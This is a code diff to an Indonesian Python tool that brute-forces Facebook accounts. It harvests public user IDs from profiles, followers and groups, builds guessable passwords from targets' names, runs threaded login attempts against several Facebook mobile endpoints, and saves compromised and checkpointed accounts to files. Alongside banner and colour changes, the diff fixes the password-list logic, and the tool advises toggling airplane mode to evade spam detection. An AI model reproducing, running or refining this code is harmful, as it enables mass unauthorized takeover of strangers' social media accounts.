@@ -205,13 +205,23 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 		
 #
 def banner():
-	cetak(panel(f"""\t\t[bold cyan]    ____  __  __ ____  ______ 
-\t\t[bold cyan]   |  _ \|  \/  |  _ \|  ____|
-\t\t [bold cyan]  | |_) | \  / | |_) | |__   
-\t\t[bold cyan]   |  _ <| |\/| |  _ <|  __|  
-\t\t[bold cyan]   | |_) | |  | | |_) | |     
-\t\t[bold cyan]   |____/|_|  |_|____/|_|
+	cetak(panel(f"""\t  [bold cyan]______  ___   _________  _______________ 
+\t  [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
+\t  [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
+\t  [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
+\t  [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
+\t  [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
                    """,width=70,title=f"",subtitle=f"[bold white] 2.2 [/]",style=f"{warna_kolor}"))
+
+#
+def banner2():
+	cetak(panel(f"""\t       [bold cyan]_      ____   _____ _____ _   _ 
+\t     [bold cyan] | |    / __ \ / ____|_   _| \ | |
+\t     [bold cyan] | |   | |  | | |  __  | | |  \| |
+\t     [bold cyan] | |   | |  | | | |_ | | | | . ` |
+\t     [bold cyan] | |___| |__| | |__| |_| |_| |\  |
+\t     [bold cyan] |______\____/ \_____|_____|_| \_|
+                   """,width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
 
 #
 def bass():
@@ -235,7 +245,7 @@ def bass():
 def login_bas():
 	try:
 		os.system('clear')
-		banner()
+		banner2()
 		ses = requests.Session()
 		cookie=input(f'└── Cookies :{H} ')
 		cookies = {'cookie':cookie}
@@ -269,11 +279,11 @@ def menu(id):
 	banner()
 	iplu = requests.get("https://api.ipify.org").text
 	gpp = []
-	gpp.append(panel(f'[cyan]Nama   : Tarista Raya\nUid    : {id}\nLahir  : 09/01/2000  ',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
+	gpp.append(panel(f'[cyan]Nama   : -\nUid    : {id}\nLahir  : -  ',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	gpp.append(panel(f'[cyan]Author   : Muh Basari\nUip      : {iplu}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	ba.print(Columns(gpp))
-	cetak(panel(f'\t                  [cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f' 01. Crack Publik Massal\n 02. Crack Followers\n 03. Crack Grup Fb\n 04. Hasil Crack Akun\n 05. Lapor Bug Sc\n 00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [bold cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]01. Crack Publik Massal\n [cyan]02. Crack Followers\n [cyan]03. [cyan]Crack Grup Fb\n [cyan]04. Hasil Crack Akun\n [cyan]05. Lapor Bug Sc\n [cyan]00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
 	______muhammad______basari______ = input(f'Pilih :{x} ')
 	if ______muhammad______basari______ in ['01','1']:
 		dump_massal()
@@ -310,8 +320,8 @@ def dump_grup():
 	
 #
 def hasil():
-	cetak(panel(f'\t                  [cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f' 01. Akun OK\n 02. Akun CP\n 03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [bold cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]01. Akun OK\n [cyan]02. Akun CP\n [cyan]03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
 	baz_code = input(f'Pilih :{x} ')
 	if baz_code in ['2']:
 		try:bass = os.listdir('CP')
@@ -416,7 +426,7 @@ def dump_massal():
 		time.sleep(4)
 		exit()
 	try:
-		cetak(panel(f' Mau Berapa Id Target 1-100',width=70,title=f"",style=f"{warna_kolor}"))
+		cetak(panel(f' [cyan]Mau Berapa Id Target 1-100',width=70,title=f"",style=f"{warna_kolor}"))
 		baz_coder = int(input(f'Pilih : '))
 	except ValueError:
 		basari_tamvan('[!] Yang Bener Napa Cuk ')
@@ -430,7 +440,7 @@ def dump_massal():
 	baz = 0
 	for met in range(baz_coder):
 		baz+=1
-		cetak(panel(f' Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
+		cetak(panel(f' [cyan]Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
 		bazfaa = input(f'Idz '+str(baz)+' : ')
 		uid.append(bazfaa)
 	for userr in uid:
@@ -462,8 +472,8 @@ def dump_massal():
 	
 #
 def setting():
-	cetak(panel(f'\t                  [cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f' 01. Akun Lama\n 02. Akun Baru\n 03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [bold cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]01. Akun Lama\n [cyan]02. Akun Baru\n [cyan]03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
 	__baz__gege__ = input(f'Pilih :{x} ')
 	if __baz__gege__ in ['1','01']:
 		for lama in sorted(id):
@@ -488,8 +498,8 @@ def setting():
 		exit()
 		
 #
-	cetak(panel(f'\t                  [cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f' 01. Mobile.Facebook\n 02. Mbasic.Facebook\n 03. Mtouch.Facebook',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]01. Mobile.Facebook\n [cyan]02. Mbasic.Facebook\n 03. [cyan]Mtouch.Facebook',width=70,title=f"",style=f"{warna_kolor}"))
 	____method_crack____ = input(f'Pilih :{x} ')
 	if ____method_crack____ in ['1','01']:
 		basari.append('m.facebook')
@@ -504,23 +514,23 @@ def setting():
 		basari.append('m.facebook')
 		
 #
-	cetak(panel(f' Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
 	pwtambah=input(f'Pilih :{x} ')
 	if pwtambah in ['y','Y']:
 		pwt.append('ya')
-		cetak(panel(f' Gunakan Koma Untuk Pemisah\n Contoh : sayang,kamu,lovyu',width=70,title=f"",style=f"{warna_kolor}"))
-		pwku=input(f'└── Sandi :{x} ')
+		cetak(panel(f' [cyan]Gunakan Koma Untuk Pemisah\n Contoh : sayang,kamu,lovyu',width=70,title=f"",style=f"{warna_kolor}"))
+		pwku=input(f'└── Sandi :{M} ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwn.append(xpw)
 	else:
 		pwt.append('no')
 		
-	cetak(panel(f' Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f' [cyan]Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
 	uat = input(f'Pilih : ')
 	if uat in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		bz = input(f'└── Ugent : ')
+		bz = input(f'└── Ugent :{M} ')
 		ualu.append(bz)
 	else:
 		ualuh.append('no')
@@ -532,8 +542,8 @@ def wordlist():
 	cetak(panel(f'           [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f'           [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f'      [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
-	print('')
-	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
+	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+	des = prog.add_task('',total=len(id))
 	with prog:
 		with tred(max_workers=30) as pool:
 			for yuzong in id2:
@@ -543,7 +553,11 @@ def wordlist():
 				if len(nmf)<6:
 					if len(frs)<3:
 						pass
-						
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -554,7 +568,7 @@ def wordlist():
 						pwv.append(frs+'12345')
 				if 'ya' in pwt:
 					for xpwn in pwn:
-						pwv.append(xpwd)
+						pwv.append(xpwn)
 				else:pass
 				if 'm.facebook' in basari:
 					pool.submit(crackm,idf,pwv)
@@ -575,7 +589,7 @@ def crackm(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'! [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(ugenm)
 	ses = requests.Session()
@@ -614,7 +628,7 @@ def crackb(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'> [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(ugenb)
 	ses = requests.Session()
@@ -653,7 +667,7 @@ def crackf(idf,pwv):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f'- [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
 	prog.advance(des)
 	ua = random.choice(ugenf)
 	ses = requests.Session()
@@ -690,8 +704,6 @@ def crackf(idf,pwv):
 #
 if __name__=='__main__':
 	try:os.system('git pull')
-	except:pass
-	try:os.mkdir('/sdcard/BMBF-DATA')
 	except:pass
 	try:os.mkdir('/sdcard/BMBF-DATA/OK')
 	except:pass
